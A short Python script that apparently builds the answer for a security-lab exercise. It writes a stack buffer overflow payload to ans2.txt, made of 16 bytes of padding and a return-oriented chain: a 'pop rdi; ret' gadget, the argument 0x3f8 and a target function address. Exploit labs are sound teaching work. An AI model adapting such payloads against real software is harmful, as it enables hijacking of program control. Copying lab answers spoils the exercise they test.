# gen_ans2.py
import struct

def p64(x): 
    return struct.pack("<Q", x)

OFFSET = 16
POP_RDI_RET = 0x4012c7
FUNC2 = 0x401216
ARG = 0x3f8

payload = b"A" * OFFSET
payload += p64(POP_RDI_RET)
payload += p64(ARG)
payload += p64(FUNC2)

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("written ans2.txt, len =", len(payload))
